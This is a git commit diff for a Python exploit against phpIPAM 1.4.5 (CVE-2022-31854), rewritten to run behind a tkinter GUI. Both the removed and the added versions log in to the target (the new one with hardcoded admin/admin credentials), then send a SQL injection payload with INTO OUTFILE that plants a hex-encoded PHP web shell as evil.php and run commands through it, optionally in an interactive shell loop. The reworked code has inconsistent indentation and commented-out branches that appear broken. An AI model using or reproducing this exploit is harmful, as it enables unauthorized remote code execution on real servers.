4742669f767f3cc6b7958adac6fdddab34815a54
ibrahim ali <82097150+abrahim7112@users.noreply.github.com>
2023-08-30 10:19:05 -0400

    Update CVE_2022_31854.py
     phpIPAM 1.4.5 - Remote Code Execution (RCE) (Authenticated)
    
    Signed-off-by: ibrahim ali <82097150+abrahim7112@users.noreply.github.com>

--- xmlin/CVE_2022_31854.py
+++ xmlin/CVE_2022_31854.py
@@ -12,77 +12,100 @@ import requests
 import argparse
 from sys import exit, argv
 from termcolor import colored
+import tkinter
+from tkinter import *
+import tkinter as tk
+from tkinter.ttk import *
+from time import strftime
+from tkinter import ttk
+def phpIPAM():
+    root = tkinter.Tk()
+    root.title("CVE_2022_31854 exploits")
+    root.geometry('800x600+0+0')
+    def printInput():
+        inp = inputtxt.get(1.0, "end-1c")
+        lbl.config(text = "attack url : "+inp)
+        url = inp
+        scroll_y = Scrollbar(root, orient=VERTICAL)
+        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
+        scroll_y.pack(side=RIGHT, fill=Y)
+        scroll_y.config(command=txtarea.yview)
+        banner = """
+        █▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
+        █▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄
 
-banner = """
-█▀█ █░█ █▀█ █ █▀█ ▄▀█ █▀▄▀█   ▄█ ░ █░█ ░ █▀   █▀ █▀█ █░░ █   ▀█▀ █▀█   █▀█ █▀▀ █▀▀
-█▀▀ █▀█ █▀▀ █ █▀▀ █▀█ █░▀░█   ░█ ▄ ▀▀█ ▄ ▄█   ▄█ ▀▀█ █▄▄ █   ░█░ █▄█   █▀▄ █▄▄ ██▄
-
-█▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
-█▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄\n"""
-print(banner)
-
-parser = argparse.ArgumentParser(usage="./exploit.py -url http://domain.tld/ipam_base_url -usr username -pwd password -cmd 'command_to_execute' --path /system/writable/path/to/save/shell", description="phpIPAM 1.4.5 - (Authenticated) SQL Injection to RCE")
-
-parser.add_argument("-url", type=str, help="URL to vulnerable IPAM", required=True)
-parser.add_argument("-usr", type=str, help="Username to log in as", required=True)
-parser.add_argument("-pwd", type=str, help="User's password", required=True)
-parser.add_argument("-cmd", type=str, help="Command to execute", default="id")
-parser.add_argument("--path", type=str, help="Path to writable system folder and accessible via webserver (default: /var/www/html)", default="/var/www/html")
-parser.add_argument("--shell", type=str, help="Spawn a shell (non-interactive)", nargs="?")
-args = parser.parse_args()
-
-url = args.url
-username = args.usr
-password = args.pwd
-command = args.cmd
-path = args.path
+        █▄▄ █▄█   █▄▄ █▀▀ █░█ █ █▄░█ █▀▄ █▄█ █▀ █▀▀ █▀▀
+        █▄█ ░█░   █▄█ ██▄ █▀█ █ █░▀█ █▄▀ ░█░ ▄█ ██▄ █▄▄\n"""
+ 
+        txtarea.insert(END, banner)
+        txtarea.pack(fill=BOTH, expand=True)
+        txtarea.configure(state ='disabled')
+        username = "admin"
+        password = "admin"
+        command = "id"
+        path = "/system/writable/path/to/save/shell"
 
 # Validating url
-if url.endswith("/"):
-	url = url[:-1]
-if not url.startswith("http://") and not url.startswith("https://"):
-	print(colored("[!] Please specify a valid scheme (http:// or https://) before the domain.", "yellow"))
-	exit()
+        if url.endswith("/"):
+	        url = url[:-1]
+        if not url.startswith("http://") and not url.startswith("https://"):
+	    #print(colored("[!] Please specify a valid scheme (http:// or https://) before the domain.", "yellow"))
+            txtarea.insert(END, "[!] Please specify a valid scheme (http:// or https://) before the domain.")
+        #exit()
 
-def login(url, username, password):
-	"""Takes an username and a password and tries to execute a login (IPAM)"""
-	data = {
-	"ipamusername": username,
-	"ipampassword": password
-	}
-	print(colored(f"[...] Trying to log in as {username}", "blue"))
-	r = requests.post(f"{url}/app/login/login_check.php", data=data)
-	if "Invalid username or password" in r.text:
-		print(colored(f"[-] There's an error when trying to log in using these credentials --> {username}:{password}", "red"))
-		exit()
-	else:
-		print(colored("[+] Login successful!", "green"))
-		return str(r.cookies)
+        def login(url, username, password):
+            """Takes an username and a password and tries to execute a login (IPAM)"""
+            data = {
+            "ipamusername": username,
+            "ipampassword": password
+            }
 
-auth_cookie = login(url, username, password)
+	    #print(colored(f"[...] Trying to log in as {username}", "blue"))
+            r = requests.post(f"{url}/app/login/login_check.php", data=data)
+            if "Invalid username or password" in r.text:
+                txtarea.insert(END, "[...] Trying to log in as admin\n")
+		    #print(colored(f"[-] There's an error when trying to log in using these credentials --> {username}:{password}", "red"))
+           # exit()
+            else:
+                txtarea.insert(END, "[+] Login successful!\n")
+		   # print(colored("[+] Login successful!", "green"))
+                return str(r.cookies)
 
-def exploit(url, auth_cookie, path, command):
-	print(colored("[...] Exploiting", "blue"))
-	vulnerable_path = "app/admin/routing/edit-bgp-mapping-search.php"
-	data = {
-	"subnet": f"\" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '{path}/evil.php' -- -",
-	"bgp_id": "1"
-	}
-	cookies = {
-	"phpipam": auth_cookie
-	}
-	requests.post(f"{url}/{vulnerable_path}", data=data, cookies=cookies)
-	test = requests.get(f"{url}/evil.php")
-	if test.status_code != 200:
-		return print(colored(f"[-] Something went wrong. Maybe the path isn't writable. You can still abuse of the SQL injection vulnerability at {url}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1", "red"))
-	if "--shell" in argv:
-		while True:
-			command = input("Shell> ")
-			r = requests.get(f"{url}/evil.php?cmd={command}")
-			print(r.text)
-	else:
-		print(colored(f"[+] Success! The shell is located at {url}/evil.php. Parameter: cmd", "green"))
-		r = requests.get(f"{url}/evil.php?cmd={command}")
-		print(f"\n\n[+] Output:\n{r.text}")
+        auth_cookie = login(url, username, password)
 
-exploit(url, auth_cookie, path, command)
+        def exploit(url, auth_cookie, path, command):
+            txtarea.insert(END, "[...] Exploiting")
+	    #print(colored("[...] Exploiting", "blue"))
+            vulnerable_path = "app/admin/routing/edit-bgp-mapping-search.php"
+            data = {
+	        "subnet": f"\" Union Select 1,0x201c3c3f7068702073797374656d28245f4745545b2018636d6420195d293b203f3e201d,3,4 INTO OUTFILE '{path}/evil.php' -- -",
+	        "bgp_id": "1"
+            }
+            cookies = {
+	        "phpipam": auth_cookie
+            }
+            requests.post(f"{url}/{vulnerable_path}", data=data, cookies=cookies)
+            test = requests.get(f"{url}/evil.php")
+            if test.status_code != 200:
+                return txtarea.insert(END, f"[-] Something went wrong. Maybe the path isn't writable. You can still abuse of the SQL injection vulnerability at {url}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1")#print(colored(f"[-] Something went wrong. Maybe the path isn't writable. You can still abuse of the SQL injection vulnerability at {url}/index.php?page=tools&section=routing&subnetId=bgp&sPage=1", "red"))
+            if "--shell" in argv:
+                while True:
+                    command = input("Shell> ")
+                    r = requests.get(f"{url}/evil.php?cmd={command}")
+                    txtarea.insert(END, r.text)#print(r.text)
+            else:
+                txtarea.insert(END, f"[+] Success! The shell is located at {url}/evil.php. Parameter: cmd")
+	   	    #print(colored(f"[+] Success! The shell is located at {url}/evil.php. Parameter: cmd", "green"))
+                r = requests.get(f"{url}/evil.php?cmd={command}")
+                txtarea.insert(END, f"\n\n[+] Output:\n{r.text}")
+		    #print(f"\n\n[+] Output:\n{r.text}")
+
+        exploit(url, auth_cookie, path, command)
+    Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
+    inputtxt = tk.Text(root,height = 1,width = 80)
+    inputtxt.pack()
+    printButton = tk.Button(root,text = "exploit", command = printInput)
+    printButton.pack()
+    lbl = tk.Label(root, text = "")
+    lbl.pack()
+    root.mainloop()
